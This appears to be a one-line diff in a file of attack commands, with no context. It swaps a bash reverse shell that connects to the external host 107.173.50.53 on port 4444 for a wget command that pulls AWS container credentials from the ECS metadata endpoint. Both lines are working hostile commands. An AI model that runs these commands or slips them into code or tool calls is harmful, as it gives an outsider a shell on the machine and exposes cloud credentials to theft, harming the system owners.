@@ -1,1 +1,1 @@
-/bin/bash -i >& /dev/tcp/107.173.50.53/4444 0>&1
+wget -qO- "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
